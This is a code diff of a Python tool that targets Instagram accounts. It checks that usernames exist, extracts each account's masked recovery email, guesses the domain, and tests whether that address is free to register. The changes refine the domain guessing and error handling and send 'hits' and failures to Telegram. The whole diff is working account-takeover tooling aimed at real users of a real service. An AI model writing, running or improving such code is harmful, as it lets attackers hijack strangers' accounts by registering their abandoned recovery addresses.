@@ -200,7 +200,8 @@ by: @m0hsvn'''
             response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=10)
             recovery_email = response.json()['email']
             return recovery_email
-        except:
+        except Exception as e:
+            print(f"[!] get_recovery_email error: {str(e)[:50]}")
             return None
 
     def guess_domain_from_recovery(self, recovery_email):
@@ -209,43 +210,62 @@ by: @m0hsvn'''
             return None
         
         try:
-            # Extract domain part (e.g., "g***l.com" or "h******.com")
+            # Extract domain part (e.g., "g***l.com" or "a**.com" or "h******.com")
             domain_part = recovery_email.split('@')[1].lower()
             
+            # Check if domain has asterisks
+            if '*' not in domain_part:
+                return domain_part  # Already unmasked, return as-is
+            
+            # Get first letter and length to guess domain
+            first_letter = domain_part[0]
+            length = len(domain_part)
+            
             # Common email domains and their patterns
-            domains = {
-                'gmail.com': ['g***l.com', 'gm**l.com', 'gma*l.com', 'gmail.com', 'g****l.com'],
-                'hotmail.com': ['h*****l.com', 'ho****l.com', 'hot***l.com', 'hotm**l.com', 'hotma*l.com', 'hotmail.com', 'h******l.com'],
-                'outlook.com': ['o*****k.com', 'ou****k.com', 'out***k.com', 'outl**k.com', 'outlo*k.com', 'outlook.com'],
-                'yahoo.com': ['y***o.com', 'ya**o.com', 'yah*o.com', 'yahoo.com', 'y****o.com'],
-                'aol.com': ['a*l.com', 'ao*.com', 'aol.com', 'a**l.com'],
-                'icloud.com': ['i****d.com', 'ic***d.com', 'icl**d.com', 'iclo*d.com', 'icloud.com'],
-                'live.com': ['l**e.com', 'li*e.com', 'liv*.com', 'live.com'],
-                'msn.com': ['m*n.com', 'ms*.com', 'msn.com'],
-                'me.com': ['m*.com', 'me.com'],
-                'mail.com': ['m**l.com', 'ma*l.com', 'mai*.com', 'mail.com']
+            # Format: first_letter -> list of (actual_domain, possible_lengths)
+            domain_patterns = {
+                'g': [('gmail.com', [9, 10])],  # g***l.com, gm**l.com
+                'h': [('hotmail.com', [11, 12]), ('hushmail.com', [13])],  # h*****l.com
+                'o': [('outlook.com', [11]), ('optonline.net', [14])],  # o*****k.com
+                'y': [('yahoo.com', [9, 10]), ('ymail.com', [9])],  # y***o.com, ym**l.com
+                'a': [('aol.com', [7, 8]), ('att.net', [7])],  # a*l.com, a**.com
+                'i': [('icloud.com', [10, 11])],  # i****d.com
+                'l': [('live.com', [8]), ('lycos.com', [9])],  # l**e.com
+                'm': [('msn.com', [7]), ('mail.com', [8, 9]), ('me.com', [6])],  # m*n.com, m**l.com
+                'p': [('protonmail.com', [14])],
+                'z': [('zoho.com', [8])],
+                'f': [('fastmail.com', [12])],
+                'r': [('rocketmail.com', [14])],
+                'c': [('comcast.net', [11])],
+                'v': [('verizon.net', [11])],
             }
             
-            # Try to match the masked domain
-            for actual_domain, patterns in domains.items():
-                for pattern in patterns:
-                    if self.match_pattern(domain_part, pattern):
-                        return actual_domain
+            # Try to match based on first letter and length
+            if first_letter in domain_patterns:
+                for domain, valid_lengths in domain_patterns[first_letter]:
+                    if length in valid_lengths:
+                        return domain
             
-            # If no match, return None
+            # If no match, return the most common for that letter
+            common_defaults = {
+                'g': 'gmail.com',
+                'h': 'hotmail.com',
+                'o': 'outlook.com',
+                'y': 'yahoo.com',
+                'a': 'aol.com',
+                'i': 'icloud.com',
+                'l': 'live.com',
+                'm': 'mail.com'
+            }
+            
+            if first_letter in common_defaults:
+                return common_defaults[first_letter]
+            
+            # Last resort: return None (unknown domain)
             return None
+            
         except:
             return None
-
-    def match_pattern(self, masked, pattern):
-        """Check if masked domain matches pattern"""
-        if len(masked) != len(pattern):
-            return False
-        
-        for m, p in zip(masked, pattern):
-            if p != '*' and m != p:
-                return False
-        return True
 
     def validate_recovery_email(self, username, recovery_email):
         """Validate that recovery email matches username pattern"""
@@ -272,59 +292,59 @@ by: @m0hsvn'''
             return False
 
     def insta1(self, email):
-        while True:
-            try:
-                csrftoken = md5(str(time()).encode()).hexdigest()
-                headers = {
-                    'accept': '*/*',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://www.instagram.com',
-                    'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
-                    'x-csrftoken': csrftoken,
-                }
-                data = {'username': email}
-                response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
-                if 'showAccountRecoveryModal' in response:
-                    return True
-                else:
-                    return False
-            except:
-                time_module.sleep(0.5)
+        try:
+            csrftoken = md5(str(time()).encode()).hexdigest()
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.instagram.com',
+                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
+                'x-csrftoken': csrftoken,
+            }
+            data = {'username': email}
+            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
+            if 'showAccountRecoveryModal' in response:
+                return True
+            else:
+                return False
+        except Exception as e:
+            print(f"[!] insta1 error: {str(e)[:50]}")
+            return False
 
     def insta2(self, email):
-        while True:
-            try:
-                url = 'https://b.i.instagram.com/api/v1/accounts/login/'
-                headers = {
-                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
-                    'Accept': '*/*',
-                    'Cookie': 'missing',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Accept-Language': 'en-US',
-                    'X-IG-Capabilities': '3brTvw==',
-                    'X-IG-Connection-Type': 'WIFI',
-                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'Host': 'i.instagram.com'
-                }
-                uid = str(uuid4())
-                data = {
-                    'uuid': uid,
-                    'password': 'ffffdddddaaa666',
-                    'username': email,
-                    'device_id': uid,
-                    'from_reg': 'false',
-                    '_csrftoken': 'missing',
-                    'login_attempt_countn': '0'
-                }
-                re = requests.post(url, headers=headers, data=data, timeout=10).text
-                if 'bad_password' in re:
-                    return True
-                else:
-                    return False
-            except:
-                time_module.sleep(0.5)
+        try:
+            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+            headers = {
+                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+                'Accept': '*/*',
+                'Cookie': 'missing',
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept-Language': 'en-US',
+                'X-IG-Capabilities': '3brTvw==',
+                'X-IG-Connection-Type': 'WIFI',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Host': 'i.instagram.com'
+            }
+            uid = str(uuid4())
+            data = {
+                'uuid': uid,
+                'password': 'ffffdddddaaa666',
+                'username': email,
+                'device_id': uid,
+                'from_reg': 'false',
+                '_csrftoken': 'missing',
+                'login_attempt_countn': '0'
+            }
+            re = requests.post(url, headers=headers, data=data, timeout=10).text
+            if 'bad_password' in re:
+                return True
+            else:
+                return False
+        except Exception as e:
+            print(f"[!] insta2 error: {str(e)[:50]}")
+            return False
 
     def check_gmail(self, email):
         while True:
@@ -574,7 +594,7 @@ by: @m0hsvn'''
                     print(f"[+] Found username: {username}")
                     
                     # Update stats display
-                    sys.stdout.write(f'\n[📊] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}\n')
+                    sys.stdout.write(f'[📊] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}\n')
                     sys.stdout.flush()
                     
                     # STEP 1: Check if Instagram account exists
@@ -590,7 +610,7 @@ by: @m0hsvn'''
                     
                     if not has_instagram:
                         self.bad_instgram += 1
-                        print(f"[✗] No Instagram account for: {username}")
+                        print(f"[✗] No Instagram account for: {username}\n")
                         continue
                     
                     self.good_insgram += 1
@@ -601,7 +621,9 @@ by: @m0hsvn'''
                     recovery_email = self.get_recovery_email(username)
                     
                     if not recovery_email:
-                        print(f"[✗] Could not get recovery email for: {username}")
+                        print(f"[✗] Could not get recovery email for: {username}\n")
+                        # Send to Telegram anyway as "Unknown Recovery"
+                        self.send_to_telegram_bad(username, "No recovery email found")
                         continue
                     
                     print(f"[✓] Recovery email found: {recovery_email}")
@@ -610,7 +632,9 @@ by: @m0hsvn'''
                     if not self.validate_recovery_email(username, recovery_email):
                         print(f"[✗] Recovery email doesn't match username pattern!")
                         print(f"    Username: {username} (first: {username[0]}, last: {username[-1]})")
-                        print(f"    Recovery: {recovery_email}")
+                        print(f"    Recovery: {recovery_email}\n")
+                        # Send to Telegram as BAD HIT
+                        self.send_to_telegram_bad(username, recovery_email, "First/Last letter mismatch ❌")
                         continue
                     
                     print(f"[✓] Recovery email matches username pattern! ✅")
@@ -619,7 +643,9 @@ by: @m0hsvn'''
                     actual_domain = self.guess_domain_from_recovery(recovery_email)
                     
                     if not actual_domain:
-                        print(f"[✗] Could not determine actual domain from: {recovery_email}")
+                        print(f"[✗] Could not determine actual domain from: {recovery_email}\n")
+                        # Send to Telegram anyway with unknown domain
+                        self.send_to_telegram_bad(username, recovery_email, "Unknown domain ❓")
                         continue
                     
                     print(f"[✓] Guessed domain: {actual_domain}")
@@ -634,13 +660,15 @@ by: @m0hsvn'''
                     elif actual_domain in ['gmail.com']:
                         is_available = self.check_gmail(full_email)
                     else:
-                        # For other domains, we can't check availability, but still consider it a hit
+                        # For other domains, we can't check availability, but still consider it a potential hit
                         print(f"[!] Cannot check availability for {actual_domain}, assuming available")
                         is_available = True
                     
                     if not is_available:
                         self.bad_email += 1
-                        print(f"[✗] Email NOT available: {full_email}")
+                        print(f"[✗] Email NOT available: {full_email}\n")
+                        # Send to Telegram as email taken
+                        self.send_to_telegram_bad(username, recovery_email, "Email already taken ❌")
                         continue
                     
                     print(f"[✓] Email IS available: {full_email}")
@@ -651,11 +679,11 @@ by: @m0hsvn'''
                     
                     if result == True:
                         self.hits += 1
-                        print(f"[🎯] SUCCESS! Total hits: {self.hits}")
+                        print(f"[🎯] SUCCESS! Total hits: {self.hits}\n")
                     
             except Exception as e:
                 print(f"[!] Error in home loop: {str(e)}")
-                time_module.sleep(1)
+                time_module.sleep(0.5)
 
 if __name__ == '__main__':
     # Start checker in background thread
